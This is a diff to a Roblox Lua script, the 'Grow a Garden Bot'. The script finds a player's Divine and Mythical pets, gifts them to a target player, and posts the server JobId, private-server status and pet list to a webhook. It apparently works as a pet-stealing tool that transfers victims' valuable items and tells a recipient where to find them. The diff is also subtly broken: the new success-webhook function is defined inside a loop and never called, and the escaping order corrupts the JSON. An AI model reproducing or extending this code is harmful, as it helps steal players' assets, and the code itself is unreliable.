@@ -95,7 +95,7 @@ local function CreateWebhookJSON(data)
     -- Content
     if data.content then
         -- Escape Quotes
-        local content = tostring(data.content):gsub('"', '\\"'):gsub("\\", "\\\\")
+        local content = tostring(data.content):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
         table.insert(jsonParts, '"content":"' .. content .. '"')
     else
         table.insert(jsonParts, '"content":"Pet Gifting Bot Update"')
@@ -122,12 +122,53 @@ local function CreateWebhookJSON(data)
             end
             
             if embed.description then
-                local desc = tostring(embed.description):gsub('"', '\\"'):gsub("\\", "\\\\")
+                local desc = tostring(embed.description):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
                 table.insert(embedParts, '"description":"' .. desc .. '"')
             end
             
             if embed.color then
                 table.insert(embedParts, '"color":' .. tostring(embed.color))
+            end
+            
+            -- Fields
+            if embed.fields and type(embed.fields) == "table" and #embed.fields > 0 then
+                local fieldsJSON = {}
+                
+                for _, field in ipairs(embed.fields) do
+                    local fieldParts = {}
+                    
+                    if field.name then
+                        local name = tostring(field.name):gsub('"', '\\"'):gsub("\\", "\\\\")
+                        table.insert(fieldParts, '"name":"' .. name .. '"')
+                    end
+                    
+                    if field.value then
+                        local value = tostring(field.value):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
+                        table.insert(fieldParts, '"value":"' .. value .. '"')
+                    end
+                    
+                    if field.inline ~= nil then
+                        table.insert(fieldParts, '"inline":' .. (field.inline and "true" or "false"))
+                    end
+                    
+                    table.insert(fieldsJSON, "{" .. table.concat(fieldParts, ",") .. "}")
+                end
+                
+                table.insert(embedParts, '"fields":[' .. table.concat(fieldsJSON, ",") .. ']')
+            end
+            
+            -- Footer
+            if embed.footer and type(embed.footer) == "table" then
+                local footerParts = {}
+                
+                if embed.footer.text then
+                    local text = tostring(embed.footer.text):gsub('"', '\\"'):gsub("\\", "\\\\")
+                    table.insert(footerParts, '"text":"' .. text .. '"')
+                end
+                
+                if #footerParts > 0 then
+                    table.insert(embedParts, '"footer":{' .. table.concat(footerParts, ",") .. '}')
+                end
             end
             
             table.insert(embedsJSON, "{" .. table.concat(embedParts, ",") .. "}")
@@ -473,12 +514,26 @@ local function GetServerInfo()
     local placeId = game.PlaceId
     local jobId = game.JobId
     local serverSize = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    
+    -- Prüfen, ob Server privat ist
+    local isPrivate = false
+    pcall(function()
+        -- Private Server haben oft weniger als 5 Max-Spieler oder einen spezifischen PrivateServerId
+        if game.PrivateServerId and game.PrivateServerId ~= "" then
+            isPrivate = true
+        elseif maxPlayers <= 6 then
+            isPrivate = true
+        end
+    end)
     
     return {
         gameId = gameId,
         placeId = placeId,
         jobId = jobId,
         serverSize = serverSize,
+        maxPlayers = maxPlayers,
+        isPrivate = isPrivate,
         timestamp = os.time()
     }
 end
@@ -486,10 +541,21 @@ end
 -- Erstellt Embed für Webhook
 local function CreatePetListEmbed(pets, targetPlayer)
     local serverInfo = GetServerInfo()
-    local description = string.format("**Server:** `%s`\n**JobId:** `%s`\n**Players:** %d\n**Target:** %s\n\n",
-        serverInfo.placeId,
+    
+    -- Server Info
+    local serverType = serverInfo.isPrivate and "Private" or "Public"
+    local description = string.format(
+        "**Server Info:**\n" ..
+        "• **JobID:** `%s`\n" ..
+        "• **Place ID:** %s\n" ..
+        "• **Players:** %d/%d\n" ..
+        "• **Server Type:** %s\n" ..
+        "• **Target:** %s\n\n",
         serverInfo.jobId,
+        serverInfo.placeId,
         serverInfo.serverSize,
+        serverInfo.maxPlayers,
+        serverType,
         targetPlayer and targetPlayer.Name or "Not found"
     )
     
@@ -501,8 +567,8 @@ local function CreatePetListEmbed(pets, targetPlayer)
         description = description .. "**🐾 Valuable Pets Found:**\n"
         for i, pet in ipairs(pets) do
             local emoji = pet.rarity == "Divine" and "✨" or "🔮"
-            description = description .. string.format("%s **%s** (%s) - Level %d\n", 
-                emoji, pet.name, pet.rarity, pet.level)
+            description = description .. string.format("%s **%s** (%s) - Level %d - ID: `%s`\n", 
+                emoji, pet.name, pet.rarity, pet.level, tostring(pet.id):sub(1, 8) .. "...")
             
             -- Count pets
             if pet.rarity == "Divine" then
@@ -520,12 +586,33 @@ local function CreatePetListEmbed(pets, targetPlayer)
         description = description .. "**❌ No valuable pets found**\n"
     end
     
+    -- Statistiken als zusätzliches Feld
+    local statField = string.format(
+        "• **Total:** %d\n• **Divine:** %d\n• **Mythical:** %d",
+        #pets, divineCount, mythicalCount
+    )
+    
     return {
         username = "Grow a Garden Bot",
         embeds = {{
             title = "🎮 Pet Scanner Report",
             description = description,
             color = #pets > 0 and 0x00ff00 or 0xff0000, -- Green if pets found, red if none
+            fields = {
+                {
+                    name = "📊 Pet Statistics",
+                    value = statField,
+                    inline = true
+                },
+                {
+                    name = "🕒 Scan Time",
+                    value = os.date("%Y-%m-%d %H:%M:%S"),
+                    inline = true
+                }
+            },
+            footer = {
+                text = "Grow a Garden Bot • " .. os.date("%Y-%m-%d")
+            }
         }}
     }
 end
@@ -630,17 +717,44 @@ local function ProcessPetGifting(targetPlayer)
                         if not currentInventory[pet.id] then
                             Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                             
-                            -- Send success webhook
-                            local successData = {
-                                username = "Grow a Garden Bot",
-                                embeds = {{
-                                    title = "🎉 Pet Gifted Successfully!",
-                                    description = string.format("**Pet:** %s (%s)\n**To:** %s\n**JobId:** `%s`",
-                                        pet.name, pet.rarity, targetPlayer.Name, game.JobId),
-                                    color = 0x00ff00
-                                }}
-                            }
-                            SendWebhook(successData)
+-- Send success webhook
+local function SendSuccessWebhook(pet, targetPlayer)
+    local serverInfo = GetServerInfo()
+    local serverType = serverInfo.isPrivate and "Private" or "Public"
+    
+    local description = string.format(
+        "**Pet Successfully Gifted!**\n\n" ..
+        "• **Pet:** %s (%s Level %d)\n" ..
+        "• **To:** %s\n" ..
+        "• **JobId:** `%s`\n" ..
+        "• **Server Type:** %s\n" ..
+        "• **Players:** %d/%d\n" ..
+        "• **Time:** %s",
+        pet.name,
+        pet.rarity,
+        pet.level,
+        targetPlayer.Name,
+        game.JobId,
+        serverType,
+        serverInfo.serverSize,
+        serverInfo.maxPlayers,
+        os.date("%Y-%m-%d %H:%M:%S")
+    )
+    
+    local successData = {
+        username = "Grow a Garden Bot",
+        embeds = {{
+            title = "🎁 Pet Gift Success!",
+            description = description,
+            color = 0x00ff00,
+            footer = {
+                text = "Grow a Garden Bot • Auto-Trader"
+            }
+        }}
+    }
+    
+    SendWebhook(successData)
+end
                         else
                             Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                         end
